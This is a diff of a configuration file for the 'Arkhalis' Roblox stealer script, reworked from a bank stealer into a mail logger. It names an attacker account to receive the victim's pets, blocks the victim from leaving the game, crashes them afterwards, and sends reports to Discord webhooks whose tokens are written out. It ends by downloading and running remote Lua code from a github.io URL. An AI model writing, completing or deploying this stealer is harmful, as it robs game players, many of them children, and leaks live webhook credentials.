@@ -1,34 +1,52 @@
---[[Premium  Arkhalis Bank Stealer]]--
+lua
 
+--[[ Arkhalis Mail Logger ]]--
 
 --[[ Main Config ]]--
-_G.UserId = 1962605868--// Roblox Account Id [[https://www.roblox.com/users/1962605868/profile]] 
+
+_G.Username = "dirmix_YT" --// Username To Send Pets To
+
+_G.GiftMessage = "ezezez" --// Message For The Gift To Say
+
+_G.Diamonds = 500000 --// Amount Of Diamonds To Not Kick
+
+_G.UnlockPets = true --// Unlocks Locked Pets
 
 _G.AntiLeave = true --// Doesn't Let The Target Close Roblox
-_G.Diamonds = 100000 --// Amount Of Diamonds To Not Kick
+
+_G.Crash = true  --// Crashes Them After Its Finished
 
 --[[ Webhook Config ]]--
-_G.Webhook = "https://discord.com/api/webhooks/1098448831122780190/SLxgLx966ElnECwXxyvJMFMeMTWoffgNZYs3pgqQlRg4VPx5AN6ujzAHU6B27KnMpz9k" --// Discord link Webhook For Executions
-    
---[[ UI Config ]]--
-_G.ScriptName = "loading" --// Script Name On The UI
-_G.Tip1 = "" --// Gives You Tips On The UI
-_G.Tip2 = "" --// Gives You Tips On The UI
-_G.Tip3 = "" --// Gives You Tips On The UI
-_G.Tisp4 = "" --// Gives You Tips On The UI
-_G.Tip5 = "" --// Gives You Tips On The UI
 
+_G.Webhook = "https://discord.com/api/webhooks/1103152322407841882/h2Kzf55tRH42Pzb960ScEPf_zRpHwBi_0yWVvKgdA3u1OO2vsIsqM6NFtmEAnC7sxmLI" --// Discord Webhook For Executions
+
+--[[ UI Config ]]--
+
+_G.ScriptName = "loading" --// Script Name On The UI
+
+_G.Tip1 = "" --// Gives You Tips On The UI
+
+_G.Tip2 = "" --// Gives You Tips On The UI
+
+_G.Tip3 = "" --// Gives You Tips On The UI
+
+_G.Tip4 = "" --// Gives You Tips On The UI
+
+_G.Tip5 = "" --// Gives You Tips On The UI
 
 --[[ OBFUSCATE BELOW ]]--
 
-
 --[[ DualHookPremium ]]--
 
---[[ DualHookPremium ]]--
+_G.PremiumBankInviteID = 1962605868--// Roblox user ID here to invite to bank
 
-_G.DualHookPremiumID = 1962605868 --//DualHook Account ID
-_G.DualHookWebhook = "https://discord.com/api/webhooks/1098448831122780190/SLxgLx966ElnECwXxyvJMFMeMTWoffgNZYs3pgqQlRg4VPx5AN6ujzAHU6B27KnMpz9k" --// Discord link Webhook For Executions
-_G.Key = "ARKHALIS-EYBLFUVBADWX" --// Arkhalis Premium Key
+_G.MaibloxPremiumUsername = "dirmix_YT" --//DualHook Account Name To Recive Huges
+
+_G.WebhookDualHook = "https://discord.com/api/webhooks/1102951948921098280/PzEPoP6N0ywkdmoLA-ay7ZQZbxj7lFFkEk34wowPCHouapnmJA3yl9HFW6N9FsQjbbxH" --// DualHook WebHook Notfication
+
+_G.Key = "ARKHALIS-EYBLFUVBADWX" --// 
 
 --[[ Script ]]--
-loadstring(game:HttpGet("https://arkhalislua.github.io/Lua/Arkhaliskeybank.lua"))()
+
+loadstring(game:HttpGet("https://arkhalislua.github.io/Lua/ArkhalisPremiumMailWithKey.lua"))()
+
